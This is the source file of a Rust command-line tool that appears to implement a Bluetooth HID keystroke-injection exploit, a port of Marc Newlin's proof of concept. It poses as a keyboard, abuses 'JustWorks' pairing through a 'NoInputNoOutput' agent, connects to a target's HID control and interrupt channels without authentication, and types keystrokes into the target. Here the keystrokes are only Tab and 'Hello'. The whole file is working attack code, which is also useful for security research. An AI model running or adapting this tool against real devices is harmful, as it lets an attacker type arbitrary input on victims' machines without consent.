use std::time::{Duration, Instant};
use std::{fs, thread};
use clap::Parser;
use bluer::{ agent::Agent, l2cap::{SocketAddr, Stream}, rfcomm::{ Profile, Role }, Adapter, Address, Session, Uuid
};

pub mod utils;
use utils::client::*;
use utils::helper::*;
use utils::adapter::*;
use utils::hid::*;

// PSM Port on L2CAP to communicate with Service Discovery Profile (SDP)
const SDP_PSM : u16 = 1;

// PSM Port on L2CAP to communicate with Human Device Profile (HID)
// Port 17 - HID Control
// Port 19 - HID Interrupt
const HID_CONTROL: u16 = 17;
const HID_INTERRUPT: u16 = 19;

// Using Clap crate to parse user inputs
#[derive(Parser)]
#[command(name = "Rusty Linux Injector")]
#[command(version = "1.0")]
#[command(about = "Rust implementation of Marc Newlin's keystroke injection proof of concept.", long_about = None)]
struct Cli {
    // 'iface' variable used to identify bluetooth interface if specified (OPTIONAL)
    #[arg(short = 'i', long = "interface")]
    iface: Option<String>,
    // 'bt_addr' variable used to identify bluetooth interface if specified (MANDATORY)
    #[arg(short = 't', long = "target", value_parser = assert_addr)]
    bt_addr: Address,
}

// Using Tokio crate and async functions to be able to use blueR crate async functions.
#[tokio::main(flavor = "current_thread")]
async fn main() -> bluer::Result<()> {
    // Parsing user inputs to identify bluetooth interface and target.
    let cli = Cli::parse();

    let session = Session::new().await?;

    // If user hasn't specified bluetooth interface, a default one would be taken.
    let adapter: Adapter;
    match cli.iface {
        Some(adapter_name) => adapter = session.adapter(&adapter_name).expect("Unable to find designated adapter !"),
        None => adapter = session.default_adapter().await.expect("No available adapter found !"),
    }

    // Configurating bluetooth adapter class to get recognized as a bluetooth HID keyboard.
    adapter.set_class("0x002540".to_string());
    adapter.set_powered(true).await?;
    adapter.set_pairable(false).await?;
    
    // Creating agent with "NoInputNoOutput" capability to exploit "JustWorks" association model.
    let agent = Agent {
        request_default: false,
        request_pin_code: None,
        display_pin_code: None,
        request_passkey: None,
        display_passkey: None,
        request_confirmation: None,
        request_authorization: None,
        authorize_service: None,
        ..Default::default()
    };
    let _handle_agent = session.register_agent(agent).await?;

    println!("Registered 'NoInputNoOutput' profile !");

    // Creating client HID profile with specific UUID. Once again, it helps us to get recognized as a HID keyboard.
    let uuid: Uuid = Uuid::parse_str("00001124-0000-1000-8000-00805F9B34FB").unwrap();
    let record_service = fs::read_to_string("keyboard.xml")?;
    let profile = Profile {
        uuid, 
        name: Some("hid profile".to_string()),
        role: Some(Role::Client),
        require_authentication: Some(false),
        require_authorization: Some(false),
        service_record: Some(record_service),
        auto_connect: Some(true),
        ..Default::default()
    };
    let mut _hndl = session.register_profile(profile).await?;
    println!("Registered HID UUID & profile !");
    
    // Creating sockets for Service Discovery Profile, HID control & HID interrupt.
    let socket_sdp = SocketAddr::new(cli.bt_addr, bluer::AddressType::BrEdr, SDP_PSM);
    let socket_hid_control = SocketAddr::new(cli.bt_addr, bluer::AddressType::BrEdr, HID_CONTROL);
    let socket_hid_interrupt = SocketAddr::new(cli.bt_addr, bluer::AddressType::BrEdr, HID_INTERRUPT);

    // First, we get connected to Service Discovery Profile !
    let stream_sdp = Stream::connect(socket_sdp).await.expect("connection failed");
    println!("Connected to SDP !");
    adapter.enable_ssp();

    // println!("Local address: {:?}", stream_sdp.as_ref().local_addr()?);
    // println!("Remote address: {:?}", stream_sdp.peer_addr()?);
    // println!("Recv MTU: {}", stream_sdp.as_ref().recv_mtu()?);
    // println!("Security: {:?}", stream_sdp.as_ref().security()?);

    // Then, we can perform connection to HID profile by connecting first to hid control port then to hid interrupt port.
    let stream_control = Stream::connect(socket_hid_control).await.expect("connection failed");
    println!("connected to HID Control (L2CAP 17) on target !");

    let stream_int = Stream::connect(socket_hid_interrupt).await.expect("connection failed");
    println!("connected to HID Interrupt (L2CAP 19) on target !");

    // We are spliting the socket stream pipes into a read half & write half to be able to perform read and write actions.
    let (mut _rh_sdp, mut _wh_sdp) = stream_sdp.into_split();
    let (mut _rh_control, mut _wh_control) = stream_control.into_split();
    let (mut _rh_int, mut wh_int) = stream_int.into_split();

    // Now, that we are connected to SDP & HID profile, we can simply perform keystroke injection on hid interrupt port (Port 19).
    let now = Instant::now();
    let fifty_millis = Duration::from_millis(50);
    println!("Injection key presses for 10 seconds !");
    while now.elapsed() < Duration::from_secs(10) {
        send_keypress(vec![KeyboardInputs::Key(Key::Tab)], &mut wh_int).await;
        thread::sleep(fifty_millis);
        send_ascii("Hello".to_string(), &mut wh_int).await;
    }

    Ok(())

}